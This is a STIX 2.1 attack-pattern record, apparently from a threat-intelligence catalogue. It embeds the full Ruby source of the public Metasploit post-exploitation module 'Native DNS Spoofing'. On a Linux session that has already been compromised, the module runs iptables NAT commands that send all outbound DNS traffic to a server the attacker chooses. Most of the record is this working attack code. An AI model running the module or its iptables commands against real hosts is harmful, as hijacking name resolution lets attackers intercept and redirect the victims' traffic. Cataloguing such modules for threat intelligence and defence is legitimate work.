{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7210d8b1-a270-412a-bb2e-be8452d12496",
    "created": "2024-08-14T16:33:13.578351Z",
    "modified": "2024-08-14T16:33:13.578354Z",
    "name": "Native DNS Spoofing module",
    "description": " This module will be applied on a session connected to a shell. It will redirect DNS Request to remote DNS server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/dns_spoofing.rb",
            "external_id": "dns_spoofing.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize\n    super(\n      'Name' => 'Native DNS Spoofing module',\n      'Description' => %q{\n        This module will be applied on a session connected to a shell. It will redirect DNS Request to remote DNS server.\n      },\n      'Author' => 'Alberto Rafael Rodriguez Iglesias <albertocysec[at]gmail.com>',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell', 'meterpreter']\n    )\n    register_options(\n      [\n        OptString.new('ORIGIN_PORT', [true, 'Origin port', '53']),\n        OptString.new('DESTINY_PORT', [true, 'Destination port', '53']),\n        OptAddress.new('DESTINY_IP', [true, 'Needed', '8.8.8.8'])\n      ]\n    )\n  end\n\n  def run\n    print_good('Spoofing DNS server...')\n    cmd_exec(\"iptables -t nat -A OUTPUT -p udp --dport #{datastore['ORIGIN_PORT']} -j DNAT --to #{datastore['DESTINY_IP']}:#{datastore['DESTINY_PORT']}\")\n    cmd_exec(\"iptables -t nat -A OUTPUT -p tcp --dport #{datastore['ORIGIN_PORT']} -j DNAT --to #{datastore['DESTINY_IP']}:#{datastore['DESTINY_PORT']}\")\n    print_good('Successfully exploited.')\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}